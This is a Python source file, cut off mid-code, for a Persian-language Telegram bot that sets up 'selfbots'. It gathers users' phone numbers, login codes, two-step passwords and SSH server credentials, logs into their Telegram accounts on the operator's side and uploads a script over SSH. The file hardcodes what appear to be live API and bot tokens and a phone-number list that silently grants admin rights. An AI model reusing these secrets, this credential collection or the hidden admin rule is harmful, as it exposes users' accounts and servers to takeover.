import os
import time
import paramiko
import ipaddress
import asyncio
import logging
import re
from pytz import timezone
from datetime import timedelta, datetime
import shutil
from pyrogram import filters
from pyrogram.enums import ChatMemberStatus
from pyrogram.errors import UserNotParticipant
from telethon import TelegramClient
from telethon.sessions import SQLiteSession
from telethon.errors import SessionPasswordNeededError
from pyrogram.filters import Filter
from pyrogram.types import ReplyKeyboardMarkup, KeyboardButton
from contextlib import contextmanager
from pyrogram import Client, errors, idle
from pyrogram.types import (
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    Message
)

os.makedirs("database", exist_ok=True)

DB_TEXT_PATH = "database/database.txt"

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
    filename="bot.log"
)
logger = logging.getLogger(__name__)

API_ID = 21991530
API_HASH = "6fedb4494836743356f1624c1e6377ae"
BOT_TOKEN = "8165013560:AAF37zrTnomh9DRnhpYqZj7YbPhUh0L_TYI"
OWNER_IDS = [7072806412, 7376216373, 7994315858, 6913657704]
CHANNEL_ID = "AlfredSelf"
GROUP_ID = "Alfredselfgp"
MAX_CONCURRENT_TASKS = 5
BANNED_FILE = "banned.txt"
BANNED_NUMBERS_FILE = "banned_numbers.txt"
MAX_RUNS_FILE = "max_runs.txt"

bot = Client("main_bot", api_id=API_ID, api_hash=API_HASH, bot_token=BOT_TOKEN)
EXECUTED_USERS = {}
CONV = {}
RUNNING_USER = None
RUN_STARTED_AT = None
NEXT_RUN_ALLOWED_AT = None
BOT_ACTIVE = True
BANNED_USERS = set()
BANNED_NUMBERS = set()
REMAINING_RUNS = 0
semaphore = asyncio.Semaphore(MAX_CONCURRENT_TASKS)
LAST_RUNS_FILE = "last_runs.txt"
LAST_RUNS = {}
ADNUMBER = ["989961936507", "989302920173", "989965573797"]

class OwnerFilter(Filter):
    async def __call__(self, client, message: Message) -> bool:
        return message.from_user.id in OWNER_IDS

is_owner = OwnerFilter()

def load_last_runs():
    if os.path.exists(LAST_RUNS_FILE):
        with open(LAST_RUNS_FILE, "r", encoding="utf-8") as f:
            for line in f:
                parts = line.strip().split(",")
                if len(parts) == 2 and parts[0].isdigit():
                    LAST_RUNS[int(parts[0])] = float(parts[1])

def save_last_runs():
    with open(LAST_RUNS_FILE, "w", encoding="utf-8") as f:
        for uid, ts in LAST_RUNS.items():
            f.write(f"{uid},{ts}\n")

load_last_runs()

if os.path.exists(BANNED_FILE):
    with open(BANNED_FILE, "r") as f:
        for line in f:
            line = line.strip()
            if line.isdigit():
                BANNED_USERS.add(int(line))

if os.path.exists(BANNED_NUMBERS_FILE):
    with open(BANNED_NUMBERS_FILE, "r") as f:
        for line in f:
            BANNED_NUMBERS.add(line.strip())

def load_max_runs():
    if os.path.exists(MAX_RUNS_FILE):
        with open(MAX_RUNS_FILE, "r") as f:
            try:
                return int(f.read().strip())
            except:
                return 0
    return 0

REMAINING_RUNS = load_max_runs()

def save_max_runs(count):
    with open(MAX_RUNS_FILE, "w") as f:
        f.write(str(count))

def save_banned_users():
    with open(BANNED_FILE, "w") as f:
        for uid in BANNED_USERS:
            f.write(f"{uid}\n")

def save_banned_numbers():
    with open(BANNED_NUMBERS_FILE, "w") as f:
        for number in BANNED_NUMBERS:
            f.write(f"{number}\n")

@contextmanager
def ssh_connection(ip, username, password):
    ssh = paramiko.SSHClient()
    try:
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(ip, username=username, password=password, timeout=20, allow_agent=False, look_for_keys=False)
        yield ssh
    finally:
        ssh.close()

def save_user_text(user_id, username=None, phone=None):
    username = f"@{username}" if username and not username.startswith("@") else username
    lines = []
    updated = False

    if os.path.exists(DB_TEXT_PATH):
        with open(DB_TEXT_PATH, "r", encoding="utf-8") as f:
            lines = f.readlines()

    for i, line in enumerate(lines):
        parts = line.strip().split('. ', 1)
        if len(parts) == 2 and parts[1].startswith(f"{user_id} "):
            number_part = parts[0]
            existing_fields = parts[1].split(" ")

            existing_user_id = existing_fields[0]
            existing_username = existing_fields[1] if len(existing_fields) > 1 else ""
            existing_phone = existing_fields[2] if len(existing_fields) > 2 else ""

            final_username = username if username and username != existing_username else existing_username
            final_phone = phone if phone and phone != existing_phone else existing_phone

            new_data = f"{existing_user_id} {final_username} {final_phone}".strip()
            lines[i] = f"{number_part}. {new_data}\n"
            updated = True
            break

    if not updated:
        index = len(lines) + 1
        new_data = f"{user_id} {username or ''} {phone or ''}".strip()
        lines.append(f"{index}. {new_data}\n")

    with open(DB_TEXT_PATH, "w", encoding="utf-8") as f:
        f.writelines(lines)

async def cleanup_sessions(user_id):
    client = CONV.get(user_id, {}).get("client")
    if client:
        try:
            await client.disconnect()
        except Exception as e:
            logger.error(f"Error disconnecting client: {e}")
        finally:
            CONV[user_id].pop("client", None)

    async def delayed_delete():
        await asyncio.sleep(10)
        try:
            local_session = "sessions/selfbot.session"
            local_journal = "sessions/selfbot.session-journal"
            for f in [local_session, local_journal]:
                if os.path.exists(f):
                    os.remove(f)
            sessions_dir = os.path.dirname(local_session)
            if os.path.exists(sessions_dir):
                shutil.rmtree(sessions_dir)
        except Exception as err:
            logger.error(f"Error deleting session files: {err}")

    asyncio.create_task(delayed_delete())

async def update_channel_message(retries=3):
    for _ in range(retries):
        try:
            now = datetime.now(timezone("Asia/Tehran"))
            current_time = now.strftime('%H:%M')

            message_text = (
                f"ساعت: {current_time}\n"
                f"تعداد ران مجاز: {REMAINING_RUNS} نفر\n"
            )

            if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:
                message_text += f"ربات استفاده شده تا ساعت: {NEXT_RUN_ALLOWED_AT.strftime('%H:%M')}\n"
            else:
                message_text += ":)\n"

            message_text += "@AlfredSelfBot"

            await bot.edit_message_text(
                chat_id=CHANNEL_ID,
                message_id=94,
                text=message_text
            )
            return
        except Exception as e:
            logger.error(f"Error updating channel message (attempt): {e}")
            await asyncio.sleep(1)

@bot.on_message(filters.command("run") & filters.private & is_owner)
async def set_max_runs(client, message: Message):
    try:
        args = message.text.split()
        if len(args) != 2:
            return await message.reply("Usage: /run <number>")
        
        count = int(args[1])
        if count < 0:
            return await message.reply("استفاده نادرست از دستور!")
        
        globals()["REMAINING_RUNS"] = count
        save_max_runs(count)
        await update_channel_message()
        await message.reply("تنظیم شد.")
    except ValueError:
        await message.reply("استفاده نادرست از دستور!")
    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطایی رخ داد!")

@bot.on_message(filters.command("runs") & filters.private & is_owner)
async def show_runs(client, message: Message):
    try:
        if REMAINING_RUNS <= 0:
            return await message.reply("بدون دسترسی مجاز!")
        
        await message.reply(f"{REMAINING_RUNS}")
    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطایی رخ داد!")

@bot.on_message(filters.command("allowed") & filters.private & is_owner)
async def allow_user_again(client, message: Message):
    try:
        args = message.text.strip().split()
        if len(args) != 2:
            return await message.reply("استفاده نادرست از دستور!")

        target = args[1]
        if target.startswith("@"):
            user = await client.get_users(target)
            uid = user.id
        else:
            uid = int(target)

        if uid in LAST_RUNS:
            del LAST_RUNS[uid]
            save_last_runs()
            await message.reply("محدودیت برداشته شد.")
        else:
            await message.reply("این کاربر محدودیتی نداشت.")
    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطا در پردازش دستور!")

@bot.on_message(filters.command("ban") & filters.private & is_owner)
async def ban_user(client, message: Message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            return await message.reply("استفاده نادرست از دستور!")
        
        target = args[1].strip()
        if target.startswith("@"):
            user = await client.get_users(target)
            uid = user.id
        else:
            uid = int(target)
        
        BANNED_USERS.add(uid)
        save_banned_users()
        
        try:
            await bot.send_message(uid, "شما توسط مدیران ربات مسدود شده‌اید و دیگر نمی‌توانید از سلف استفاده کنید.")
        except:
            pass
        
        await message.reply("بن شد!")
    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطا در بن کردن کاربر!")

@bot.on_message(filters.command("unban") & filters.private & is_owner)
async def unban_user(client, message: Message):
    try:
        args = message.text.split(maxsplit=1)
        if len(args) < 2:
            return await message.reply("استفاده نادرست از دستور!")
        
        target = args[1].strip()
        if target.startswith("@"):
            user = await client.get_users(target)
            uid = user.id
        else:
            uid = int(target)
        
        BANNED_USERS.discard(uid)
        save_banned_users()
        await message.reply("رفع بن شد!")
    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطا در رفع بن!")

@bot.on_message(filters.command("banall") & filters.private & is_owner)
async def ban_number(_, message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            return await message.reply("استفاده نادرست از دستور!")
        
        phone = parts[1].strip()
        BANNED_NUMBERS.add(phone)
        save_banned_numbers()
        await message.reply("شماره بن شد!")
    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطا در پردازش دستور!")

@bot.on_message(filters.command("unbanall") & filters.private & is_owner)
async def unban_number(_, message):
    try:
        parts = message.text.split()
        if len(parts) != 2:
            return await message.reply("استفاده نادرست از دستور!")
        
        phone = parts[1].strip()
        BANNED_NUMBERS.discard(phone)
        save_banned_numbers()
        await message.reply("شماره رفع بن شد!")
    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطا در پردازش دستور!")

@bot.on_message(filters.command("bot") & filters.private & is_owner)
async def toggle_bot(client, message: Message):
    try:
        global BOT_ACTIVE
        args = message.text.split()
        if len(args) != 2 or args[1].lower() not in ["on", "off"]:
            return await message.reply("استفاده نادرست از دستور!")
        
        BOT_ACTIVE = args[1].lower() == "on"
        status = "روشن" if BOT_ACTIVE else "خاموش"
        await message.reply(f"{status} شد.")
    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطا در تغییر وضعیت ربات!")

@bot.on_message(filters.command("savechannel"))
async def save_channel_info(client, message):
    try:
        chat = message.chat
        chat_id = chat.id
        title = chat.title
        await message.reply(f"""
Channel was detected!
ChannelID: `{chat_id}`
Title: {title}
""")

        with open("channel_id.txt", "w") as f:
            f.write(str(chat_id))

    except Exception as e:
        await message.reply(f"{e}")

@bot.on_message(filters.command("start") & filters.private)
async def start(client, message: Message):
    try:
        if message.from_user.id in BANNED_USERS:
            return

        try:
            await client.get_chat_member(CHANNEL_ID, message.from_user.id)
            await client.get_chat_member(GROUP_ID, message.from_user.id)
        except errors.UserNotParticipant:
            return await client.send_message(
                message.chat.id,
                "شما عضو کانال و گروه نیستید. لطفاً ابتدا عضو شوید و سپس /start را ارسال کنید.",
                reply_markup=InlineKeyboardMarkup([
                    [InlineKeyboardButton("عضو شو", url=f"https://t.me/{CHANNEL_ID}")],
                    [InlineKeyboardButton("عضو شو", url=f"https://t.me/{GROUP_ID}")]
                ])
            )

        user_id = message.from_user.id
        if not BOT_ACTIVE and user_id not in OWNER_IDS:
            return await message.reply("ربات در حال حاضر خاموش است!")

        kb = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
        InlineKeyboardButton("قوانین", callback_data="rules")
    ],
    [
        InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
    ],
    [
        InlineKeyboardButton("آموزش", callback_data="edu_main")
    ]
])
        await message.reply_animation(
            animation="CgACAgIAAxkBAAEBj2FofjFHDIBktqBm27Y5nJOz3xE8jAACSoAAAs9n-Esgn6vFglgyqh4E",
            caption="""سلام، به ربات سلف ساز آلفرد خوش اومدی!  
  
قبل از اجرای سلف حتما قوانین را مطالعه کنید:""",
            reply_markup=kb
        )

        global RUNNING_USER, RUN_STARTED_AT
        save_user_text(user_id, username=message.from_user.username or message.from_user.first_name)

        if RUNNING_USER == user_id:
            RUNNING_USER = None
            RUN_STARTED_AT = None
            CONV.pop(user_id, None)

    except Exception as e:
        logger.error(f"{e}")
        await message.reply("خطایی رخ داده است! لطفاً دوباره امتحان کنید.")

async def reset_run(client, chat_id, uid):
    await asyncio.sleep(300)
    if RUNNING_USER == uid:
        globals()["RUNNING_USER"] = None
        globals()["RUN_STARTED_AT"] = None
        globals()["CONV"].pop(uid, None)
        try:
            await client.send_message(chat_id, "به محدودیت زمانی 5 دقیقه رسیدید! برای اجرای دوباره سلف، دستور /start را ارسال کنید.")
        except Exception as e:
            logger.error(f"{e}")

@bot.on_callback_query(filters.regex("rules"))
async def show_rules(client, cb):
    try:
        await cb.message.edit_text(
            """کاربر گرامی، فروش این سلف به هر صورت غیر مجاز بوده و در صورت فروش حساب شما دیلیت خواهد شد و هرگونه مشکلی که برای حساب شما رخ دهد به سلف و مالک مربوط نخواهد بود. همچنین هرگونه بی احترامی به مدیران و سازنده سلف ممنوع می‌باشد.""",
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("بازگشت", callback_data="back_to_start")]
            ])
        )
    except Exception as e:
        logger.error(f"{e}")

@bot.on_callback_query(filters.regex("back_to_start"))
async def back_to_start(client, cb):
    try:
        kb = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("اجرای سلف", callback_data="run_self"),
        InlineKeyboardButton("قوانین", callback_data="rules")
    ],
    [
        InlineKeyboardButton("چک کردن شماره", callback_data="check_number")
    ],
    [
        InlineKeyboardButton("آموزش", callback_data="edu_main")
    ]
])
        await cb.message.edit_text("""سلام، به ربات سلف ساز آلفرد خوش اومدی!

برای اجرای سلف روی یکی از دکمه‌های زیر کلیک کن:""",
            reply_markup=kb
        )
    except Exception as e:
        logger.error(f"{e}")

@bot.on_callback_query(filters.regex("run_self"))  
async def run_self(client, cb):  
    async with semaphore:  
        try:
            user_id = cb.from_user.id

            try:
                chat_member = await client.get_chat_member("@AlfredSelfGp", user_id)

                if chat_member.status == ChatMemberStatus.BANNED:
                    return await cb.answer("شما از گروه مسدود شده‌اید!", show_alert=True)

                if chat_member.status == ChatMemberStatus.LEFT:
                    return await cb.answer("شما عضو گروه نیستید! لطفاً اول در گروه عضو شوید.", show_alert=True)

                if chat_member.status == ChatMemberStatus.RESTRICTED:
                    return await cb.answer("شما در گروه محدود هستید!", show_alert=True)
                    
            except UserNotParticipant:
                return await cb.answer("شما عضو گروه نیستید! لطفاً اول در گروه عضو شوید.", show_alert=True)
                
            except Exception as e:
                logger.error(f"{e}")
                return await cb.answer("خطا در بررسی وضعیت عضویت شما!", show_alert=True)

            if not BOT_ACTIVE and user_id not in OWNER_IDS:  
                return await cb.answer("ربات خاموش است!", show_alert=True)  

            global RUNNING_USER, RUN_STARTED_AT, NEXT_RUN_ALLOWED_AT, REMAINING_RUNS  
            now = datetime.now(timezone("Asia/Tehran"))  
            if user_id not in OWNER_IDS:  
                last_ts = LAST_RUNS.get(user_id)  
                if last_ts:  
                    last_time = datetime.fromtimestamp(last_ts, tz=timezone("Asia/Tehran"))  
                    if (now - last_time).total_seconds() < 86400:  
                        return await cb.answer("شما امروز سلف ران کردید!", show_alert=True)  

            if user_id not in OWNER_IDS:  
                if NEXT_RUN_ALLOWED_AT and now < NEXT_RUN_ALLOWED_AT:  
                    wait_minutes = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() // 60)  
                    wait_seconds = int((NEXT_RUN_ALLOWED_AT - now).total_seconds() % 60)  
                    next_time = NEXT_RUN_ALLOWED_AT.strftime("%H:%M")  
                    return await cb.answer(  
                        f"ربات استفاده شده تا {next_time} لطفا برای ران مجدد 00:{wait_minutes}:{wait_seconds:02d} دیگر صبر کنید!",  
                        show_alert=True  
                    )  

                if REMAINING_RUNS <= 0:  
                    return await cb.answer(  
                        "در حال حاضر هیچ ران مجازی باقی نمانده است! لطفاً منتظر بمانید تا مدیران دسترسی ران بدهند.",  
                        show_alert=True  
                    )  

            try:  
                await cb.message.delete()  
            except Exception as e:  
                logger.error(f"{e}")  

            if user_id not in OWNER_IDS and RUNNING_USER and RUNNING_USER != user_id:  
                elapsed = (now - RUN_STARTED_AT).total_seconds() if RUN_STARTED_AT else 0  
                remaining = max(0, 300 - elapsed)  
                if remaining > 0:  
                    m, s = divmod(int(remaining), 60)  
                    return await cb.answer(  
                        f"کاربر دیگری درحال اجرای سلف است، لطفا 00:{m:02d}:{s:02d} دیگر منتظر بمانید.",  
                        show_alert=True  
                    )  
                else:  
                    RUNNING_USER = None  
                    RUN_STARTED_AT = None  

            RUNNING_USER = user_id  
            RUN_STARTED_AT = now  
            asyncio.create_task(reset_run(client, cb.message.chat.id, user_id))

            keyboard = ReplyKeyboardMarkup(
                [[KeyboardButton("ارسال شماره", request_contact=True)]],
                resize_keyboard=True, one_time_keyboard=True
            )

            bot_msg = await client.send_message(
                chat_id=cb.message.chat.id,
                text="جهت تأیید قوانین ذکر شده در بخش قوانین، شماره خود را از طریق دکمه زیر ارسال کنید:",
                reply_markup=keyboard
            )
            CONV[user_id] = {"step": "get_number", "last_bot_msg": bot_msg.id}
        except Exception as e:
            logger.error(f"{e}")
            await cb.answer("خطایی رخ داده است!", show_alert=True)

@bot.on_callback_query(filters.regex("check_number"))
async def check_number_start(client, cb):
    user_id = cb.from_user.id
    await cb.message.delete()
    keyboard = ReplyKeyboardMarkup([[KeyboardButton("ارسال شماره", request_contact=True)]],
                                  resize_keyboard=True, one_time_keyboard=True)
    msg = await client.send_message(cb.message.chat.id,
        "با استفاده از دکمه زیر شماره خود را ارسال کنید:",
        reply_markup=keyboard)
    CONV[user_id] = {"step": "check_number", "last_bot_msg": msg.id}

@bot.on_callback_query(filters.regex("edu_main"))
async def edu_main_menu(client, cb):
    try:
        await cb.message.edit_text(
            "لطفاً یکی از موارد زیر را برای آموزش انتخاب کنید:",
            reply_markup=InlineKeyboardMarkup([
                [
                    InlineKeyboardButton("ران", callback_data="edu_run"),
                    InlineKeyboardButton("سرور", callback_data="edu_server")
                ],
                [
                    InlineKeyboardButton("بازگشت", callback_data="back_to_start")
                ]
            ])
        )
    except Exception as e:
        logger.error(f"{e}")

@bot.on_callback_query(filters.regex("edu_run"))
async def edu_run(client, cb):
    try:
        await cb.message.delete()
        await client.copy_message(
            chat_id=cb.message.chat.id,
            from_chat_id="@AlfredSelf",
            message_id=311
        )
    except Exception as e:
        logger.error(f"{e}")

@bot.on_callback_query(filters.regex("edu_server"))
async def edu_server(client, cb):
    try:
        await cb.message.delete()
        await client.copy_message(
            chat_id=cb.message.chat.id,
            from_chat_id="@AlfredSelf",
            message_id=310
        )
    except Exception as e:
        logger.error(f"{e}")

@bot.on_message(filters.private & ~filters.command(["start", "ban", "unban", "bot", "run", "runs"]))
async def conversation_handler(client, message: Message):
    try:
        global RUNNING_USER, RUN_STARTED_AT, NEXT_RUN_ALLOWED_AT
        user_id = message.from_user.id
        now = datetime.now(timezone("Asia/Tehran"))

        if user_id not in CONV:
            return

        step = CONV[user_id]["step"]

        if step == "check_number":
            if not message.contact or not message.contact.phone_number:
                return await message.reply("لطفاً فقط با استفاده از دکمه ارسال شماره، شماره خود را ارسال کنید.")

            number = message.contact.phone_number.replace("+", "").replace(" ", "").strip()
            save_user_text(user_id, username=message.from_user.username, phone=number)

            try:
                await message.delete()
                if "last_bot_msg" in CONV[user_id]:
                    await client.delete_messages(chat_id=message.chat.id, message_ids=CONV[user_id]["last_bot_msg"])
            except Exception as e:
                logger.error(f"{e}")

            GIF_BANNED = "CgACAgIAAxkBAAEBfwRofOMVBCvw21NCkKG1odW-zMyjMAACfgUAAmUOMUrjPb4_4gfhAAEeBA"
            GIF_FREE = "CgACAgIAAxkBAAEBfw9ofOOJkWHX18Sh13n3Gl9z1KnUdAACqAIAAlA4eUlfA-3Irybg5x4E"
            GIF_ADMIN = "CgACAgIAAxkBAAEBfxJofOPF_zwXdcx7HbaXD52EvTo0qQACVAQAAidPUUkXUlAq8rb9mx4E"

            if any(number == b.strip().replace("+", "").replace(" ", "") for b in BANNED_NUMBERS):
                await client.send_animation(chat_id=user_id, animation=GIF_BANNED, caption="شماره شما بن شده است!")
            elif number in ADNUMBER:
                if user_id not in OWNER_IDS:
                    OWNER_IDS.append(user_id)
                    await client.send_animation(chat_id=user_id, animation=GIF_ADMIN, caption="شما به عنوان ادمین شناسایی شدید و اضافه شدید!")
                else:
                    await client.send_animation(chat_id=user_id, animation=GIF_ADMIN, caption="شما ادمین هستید!")
            else:
                await client.send_animation(chat_id=user_id, animation=GIF_FREE, caption="شما مجاز به استفاده از سلف ساز هستید!")

            CONV.pop(user_id, None)
            return

        if step == "get_number":
            if not (message.contact and message.contact.phone_number):
                if user_id in OWNER_IDS and message.text and message.text.strip().isdigit():
                    number = message.text.strip()
                else:
                    return await message.reply("لطفاً فقط با استفاده از دکمه 'ارسال شماره' شماره خود را ارسال کنید.")
            else:
                number = message.contact.phone_number.replace("+", "").strip()

            if user_id not in OWNER_IDS and number.startswith(("93", "972")):
                return await message.reply_animation(
                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                    caption='''شماره تلفن کشور شما مجاز نیست!

سازنده:
@CodeAlfred'''
                )

            try:
                await message.delete()
                if "last_bot_msg" in CONV[user_id]:
                    await client.delete_messages(
                        chat_id=message.chat.id,
                        message_ids=CONV[user_id]["last_bot_msg"]
                    )
            except Exception as e:
                logger.error(f"{e}")

            os.makedirs("sessions", exist_ok=True)
            session_path = os.path.join("sessions", "selfbot")

            for file in [session_path + ".session", session_path + ".session-journal"]:
                if os.path.exists(file):
                    try:
                        os.remove(file)
                    except Exception as e:
                        logger.error(f"{e}")

            if number in BANNED_NUMBERS:
                return await message.reply_animation(
                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                    caption='''شما بن شده‌اید! برای حل مشکل به پشتیبانی مراجعه کنید.''')

            from telethon import TelegramClient
            CONV[user_id].update({"number": number, "session": session_path})
            save_user_text(user_id, phone=number)

            tele_client = TelegramClient(
            session=session_path,
            api_id=API_ID,
            api_hash=API_HASH,
            device_model="Samsung Galaxy A52",
            system_version="Android 13",
            app_version="11.13.2 (6060)",
            lang_code="en")
            await tele_client.connect()

            try:
                sent = await tele_client.send_code_request(number)
                CONV[user_id].update({
                    "client": tele_client,
                    "sent_code": sent,
                    "step": "get_code"
                })
                enter_code_msg = await message.reply("کد دریافتی را به صورت اعداد فارسی وارد کنید:")
                CONV[user_id]["last_bot_msg"] = enter_code_msg.id
            except Exception as e:
                await message.reply_animation(
                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                    caption="خطا در ارسال کد! شماره تلفن شما محدودیت زمانی خورده است یا از تلگرام مسدود شده است، لطفا آن را برسی کنید."
                )
                await tele_client.disconnect()
                CONV.pop(user_id, None)
                if RUNNING_USER == user_id:
                    RUNNING_USER = None
                    RUN_STARTED_AT = None

        elif step == "get_code":
            persian = "۰۱۲۳۴۵۶۷۸۹"
            english = "0123456789"
            code = message.text.strip().translate(str.maketrans(persian, english))
            client = CONV[user_id]["client"]

            try:
                await message.delete()
                if "last_bot_msg" in CONV[user_id]:
                    await bot.delete_messages(
                        chat_id=message.chat.id,
                        message_ids=CONV[user_id]["last_bot_msg"]
                    )
            except Exception as e:
                logger.error(f"{e}")

            try:
                sent = CONV[user_id]["sent_code"]
                await client.sign_in(
                    phone=CONV[user_id]["number"],
                    code=code
                )
                bot_msg = await message.reply("""ورود موفق! آیپی سرور را ارسال کنید:

سایت دریافت سرور:
cp.sprinthost.ru""")
                CONV[user_id].update({"step": "get_ip", "last_bot_msg": bot_msg.id})
            except Exception as e:
                from telethon.errors import SessionPasswordNeededError
                if isinstance(e, SessionPasswordNeededError):
                    twofa_msg = await message.reply("رمز دو مرحله‌ای را وارد کنید:")
                    CONV[user_id].update({
                        "step": "get_2fa",
                        "last_bot_msg": twofa_msg.id
                    })
                else:
                    await message.reply_animation(
                        animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                        caption="کد ورود اشتباه است یا فرمت غلط است!"
                    )
                    await client.disconnect()
                    CONV.pop(user_id, None)
                    if RUNNING_USER == user_id:
                        RUNNING_USER = None
                        RUN_STARTED_AT = None

        elif step == "get_2fa":
            password = message.text.strip()
            client = CONV[user_id]["client"]

            try:
                await message.delete()
                if "last_bot_msg" in CONV[user_id]:
                    await bot.delete_messages(
                        chat_id=message.chat.id,
                        message_ids=CONV[user_id]["last_bot_msg"]
                    )
            except Exception as e:
                logger.error(f"{e}")

            try:
                await client.sign_in(password=password)
                CONV[user_id]["two_step"] = password

                bot_msg = await message.reply("""ورود موفق! آیپی سرور را ارسال کنید:

سایت دریافت سرور:
cp.sprinthost.ru""")
                CONV[user_id].update({"step": "get_ip", "last_bot_msg": bot_msg.id})
            except Exception as e:
                await message.reply_animation(
                   animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                   caption="رمز دومرحله ای اشتباه است!"
               )
                await client.disconnect()
                CONV.pop(user_id, None)
                if RUNNING_USER == user_id:
                    RUNNING_USER = None
                    RUN_STARTED_AT = None

        elif step == "get_ip":
            CONV[user_id]["ip"] = message.text.strip()
            try:
                await message.delete()
                await client.delete_messages(
                    chat_id=message.chat.id,
                    message_ids=CONV[user_id]["last_bot_msg"]
                )
            except Exception as e:
                logger.error(f"{e}")

            bot_msg = await message.reply("""یوزرنیم سرور را ارسال کنید:

سایت دریافت سرور:
cp.sprinthost.ru""")
            CONV[user_id].update({"step": "get_user", "last_bot_msg": bot_msg.id})

        elif step == "get_user":
            CONV[user_id]["user"] = message.text.strip()
            try:
                await message.delete()
                await client.delete_messages(
                    chat_id=message.chat.id,
                    message_ids=CONV[user_id]["last_bot_msg"]
                )
            except Exception as e:
                logger.error(f"{e}")

            bot_msg = await message.reply("""پسورد سرور را ارسال کنید:

سایت دریافت سرور:
cp.sprinthost.ru""")
            CONV[user_id].update({"step": "get_pass", "last_bot_msg": bot_msg.id})

        elif step == "get_pass":
            CONV[user_id]["passwd"] = message.text.strip()
            try:
                await message.delete()
                await client.delete_messages(
                    chat_id=message.chat.id,
                    message_ids=CONV[user_id]["last_bot_msg"]
                )
            except Exception as e:
                logger.error(f"{e}")

            ip = CONV[user_id]["ip"]
            server_user = CONV[user_id]["user"]
            passwd = CONV[user_id]["passwd"]

            try:
                ipaddress.ip_address(ip)
            except ValueError:
                await message.reply_animation(
                    animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                    caption="""آی‌پی وارد شده معتبر نیست!

سایت دریافت سرور:
cp.sprinthost.ru"""
                )
                await cleanup_sessions(user_id)
                CONV.pop(user_id, None)
                if RUNNING_USER == user_id:
                    RUNNING_USER = None
                    RUN_STARTED_AT = None
                return

            wait_msg = None
            try:
                wait_msg = await message.reply_animation(
                    animation="CgACAgIAAxkBAAEBj29ofjGffClyEm1sH7iuYHBgKJLapwACVnwAAquO-Et73xsxHfqWqR4E",
                    caption="""در حال اجرای عملیات ران لطفا صبر کنید!""",
                )
            except Exception as gif_error:
                logger.error(f"Error sending animation: {gif_error}")
                wait_msg = await message.reply("""در حال اجرای عملیات ران لطفا صبر کنید!""")

            try:
                with ssh_connection(ip, server_user, passwd) as ssh:
                    sftp = ssh.open_sftp()
                    sftp.get_channel().settimeout(30)

                    try:
                        sftp.stat("self")
                        await message.reply_animation(
                            animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                            caption="""سرور قبلا استفاده شده است! لطفا از سرور جدید استفاده کنید.

cp.sprinthost.ru"""
                        )
                        if wait_msg:
                            try:
                                await wait_msg.delete()
                            except Exception as delete_error:
                                logger.error(f"Error deleting wait message: {delete_error}")
                        await cleanup_sessions(user_id)
                        CONV.pop(user_id, None)
                        if RUNNING_USER == user_id:
                            RUNNING_USER = None
                            RUN_STARTED_AT = None
                        return
                    except FileNotFoundError:
                        pass

                    try:
                        stdin, stdout, stderr = ssh.exec_command("mkdir -p self", timeout=30)
                        exit_code = stdout.channel.recv_exit_status()
                        if exit_code != 0:
                            error = stderr.read().decode().strip()
                            raise Exception("خطا در اجرای سلف، لطفا از سالم بودن سرور خود و صحیح بودن اطلاعات ارسالی آن مطمئن شوید.")
                    except Exception as e:
                        await message.reply_animation(
                            animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                            caption="خطا در اجرای سلف! لطفا مطمئن شوید اطلاعات سرور صحیح است یا سرورتان مسدود نشده است."
                        )
                        await cleanup_sessions(user_id)
                        CONV.pop(user_id, None)
                        if RUNNING_USER == user_id:
                            RUNNING_USER = None
                            RUN_STARTED_AT = None
                        return

                    try:
                        stdin, stdout, stderr = ssh.exec_command("mkdir -p file", timeout=30)
                        exit_code = stdout.channel.recv_exit_status()
                        if exit_code != 0:
                            error = stderr.read().decode().strip()
                            raise Exception("خطا در اجرای سلف، لطفا از سالم بودن سرور خود و صحیح بودن اطلاعات ارسالی آن مطمئن شوید.")
                    except Exception as e:
                        await message.reply_animation(
                            animation="CgACAgIAAxkBAAEBj7ZofjRQXdSA6F3e236N2MId2RofMgACkXwAAquO-Esza0yC5qLo5B4E",
                            caption="خطا در اجرای سلف! لطفا مطمئن شوید اطلاعات سرور صحیح است یا سرورتان مسدود نشده است."
                        )
                        await cleanup_sessions(user_id)
                        CONV.pop(user_id, None)
                        if RUNNING_USER == user_id:
                            RUNNING_USER = None
                            RUN_STARTED_AT = None
                        return

                    sftp.put("file/self.py", "file/self.py")
                    stdin, stdout, stderr = ssh.exec_command("cp file/self.py self/self.py", timeout=30)
                    exit_code = stdout.channel.recv_exit_status()
                    if exit_code != 0:
